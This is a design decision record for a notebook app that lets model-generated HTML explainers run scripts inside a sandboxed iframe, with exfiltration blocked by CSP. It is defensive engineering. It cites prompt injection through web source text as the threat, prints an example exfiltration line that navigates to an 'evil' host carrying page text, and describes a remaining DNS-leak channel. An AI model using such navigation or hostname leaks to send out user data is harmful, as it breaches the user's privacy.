# ADR-015: Generated explainers may run scripts, in a sandbox that can't send data out

- **Status**: Accepted
- **Date**: 2026-11
- **Related**: #19 (Generate Explainer), #20, migration 103 (note files), migration 104

## Context
"Generate Explainer" asks the chat model for one interactive HTML page (tabs, steppers, quizzes, clickable diagrams), so the page needs JavaScript. Until now every HTML note was shown in an iframe with an empty `sandbox` and served with `CSP: sandbox`, so no script could ever run. The model's output is not trusted either: source text from web pages can carry prompt injection, so the generated code must not be able to reach the app, the API token, or send the page's text (derived from the notebook) anywhere.

## Decision
- A note flagged `explainer` (set only by the server-side generator, never by an upload or the notes API) is shown in an iframe with `sandbox="allow-scripts"` and **without** `allow-same-origin`. Scripts run in an opaque origin: no access to the app's DOM, `localStorage` (where the auth token lives), cookies, `top.location` or same-origin API calls; `window.open` is blocked.
- **Subresources:** before saving, the generator injects a CSP `<meta>` as the first element of `<head>`: `default-src 'none'`, inline scripts/styles only, `data:` images/fonts/media, `connect-src`, `form-action` and `base-uri` `'none'`. That blocks fetch, XHR, `sendBeacon`, WebSocket, images and prefetch links. CSPs combine restrictively, so a policy the model writes cannot loosen it. The same policy plus `sandbox allow-scripts` is sent as a header when the file is served directly.
- **Navigation:** the frame's own CSP does not govern navigation, and a sandboxed frame may navigate itself (`location.href = 'https://evil/?d=' + text`). The app therefore sends `Content-Security-Policy: frame-src blob: https://www.youtube.com https://www.youtube-nocookie.com` on every route (`frontend/next.config.ts`; every route because client-side navigation keeps the first document's policy). Frames may only load blob: URLs (the note viewers) and the YouTube embed, so the explainer's self-navigation is refused.
- **Resource hints:** CSP does not cover `<link rel=preconnect|dns-prefetch>`, which can leak a hostname. `harden_html()` strips those, the other prefetch/preload hints and `<meta http-equiv=refresh>`. This is regex on model output, so it is defence in depth only; a script can still add a hint at runtime.
- Uploaded HTML keeps the fully locked sandbox. The flag is the only switch.
- Explainers are **not offered for download**, and the viewer never opens their blob URL in a new tab: a copy opened from disk (`file:` origin) or top-level would run with only the meta CSP, outside the sandbox and the app's `frame-src`.

## Alternatives considered
- Static explainers (no JavaScript): safe but loses the interactivity that is the point of the feature.
- Serving explainers from a separate origin: strong isolation from the app, but needs a second host/port and config for a self-hosted single-user app, and does not by itself stop exfiltration.
- Sanitising the generated HTML: an allow-list sanitiser would strip the scripts we want, and blacklist sanitising of scripts is unreliable.

## Consequences
- Explainers work offline but cannot use CDNs, web fonts or remote images; the prompt tells the model so.
- **Residual risk:** DNS-level leaks through resource hints added by script at runtime (a few characters per lookup, via a hostname the attacker controls). Accepted for a self-hosted, single-user app; revisit if explainers become shareable.
- Any new iframe in the app must be added to `frame-src` in `next.config.ts`, or it will be blocked.
- Anything that sets `explainer` on a note must only do so for server-generated HTML. A future "import explainer" or "download explainer" feature needs its own decision.
- If the viewer ever adds `allow-same-origin`, opens explainers top-level, or `frame-src` is loosened to allow `https:`, this record is broken. Tests cover the served CSP header, the stripping, and the `frame-src` header in `next.config.ts`.
